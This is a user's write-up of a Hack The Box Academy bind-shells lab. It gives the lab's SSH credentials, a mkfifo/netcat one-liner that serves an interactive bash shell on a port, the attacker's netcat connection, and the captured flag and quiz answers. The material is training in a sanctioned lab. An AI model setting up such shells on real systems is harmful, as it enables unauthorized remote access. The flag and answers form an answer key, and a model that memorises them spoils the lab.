### HTB Pentester Path <br>
### Shells & Payloads - Bind Shells Lab <br>
<mark>hook it up with a &#x2B50; if this helps!</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>
<br>

---
IP:
10.129.201.134

SSH to 10.129.201.134 (ACADEMY-SHELLS-WEBSHELLS) with: <br>
htb-student:HTB_@cademy_stdnt!

---

### Question 1:
Des is able to issue the command nc -lvnp 443 on a Linux target. What port will she need to connect to from her attack box to successfully establish a shell session?

&#x1F6A9; **443**, der.

 
---
### Question 2:
SSH to the target, create a bind shell, then use netcat to connect to the target using the bind shell you set up.
When you have completed the exercise, submit the contents of the flag.txt file located at /customscripts.

lets start with an SSH into Ubuntu box:

	$ ssh htb-student@10.129.201.134

Checked int/tun IP, then served a bind shell bash script on that addr:

	htb-student@ubuntu:~$ ip a
	1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
	    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
	    inet 127.0.0.1/8 scope host lo
	       valid_lft forever preferred_lft forever
	    inet6 ::1/128 scope host 
	       valid_lft forever preferred_lft forever
	2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
	    link/ether 00:50:56:b0:fa:8c brd ff:ff:ff:ff:ff:ff
	    inet 10.129.201.134/16 brd 10.129.255.255 scope global dynamic ens160
	       valid_lft 2616sec preferred_lft 2616sec
	    inet6 dead:beef::250:56ff:feb0:fa8c/64 scope global dynamic mngtmpaddr 
	       valid_lft 86400sec preferred_lft 14400sec
	    inet6 fe80::250:56ff:feb0:fa8c/64 scope link 
	       valid_lft forever preferred_lft forever


	htb-student@ubuntu:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.201.134 7777 > /tmp/f

Then just connected to the shell being served from my pwnbox:

	$ nc -nv 10.129.201.134 7777 
	(UNKNOWN) [10.129.201.134] 7777 (?) open
	To run a command as administrator (user "root"), use "sudo <command>".
	See "man sudo_root" for details.
	
	htb-student@ubuntu:~$ ls
	ls
	htb-student@ubuntu:~$ cd ..
	cd ..
	htb-student@ubuntu:/home$ cd ..
	cd ..
	htb-student@ubuntu:/$ ls 
	ls 
	bin
	boot
	cdrom
	customscripts
	dev
	etc
	home
	lib
	lib32
	lib64
	libx32
	lost+found
	media
	mnt
	opt
	proc
	root
	run
	sbin
	snap
	srv
	sys
	tmp
	usr
	var
	htb-student@ubuntu:/$ cd /customscripts
	cd /customscripts
	htb-student@ubuntu:/customscripts$ ls
	ls
	flag.txt
	htb-student@ubuntu:/customscripts$ cat flag.txt
	cat flag.txt
	B1nD_Shells_r_cool
	htb-student@ubuntu:/customscripts$ 


&#x1F6A9; found **B1nD_Shells_r--edit--**.
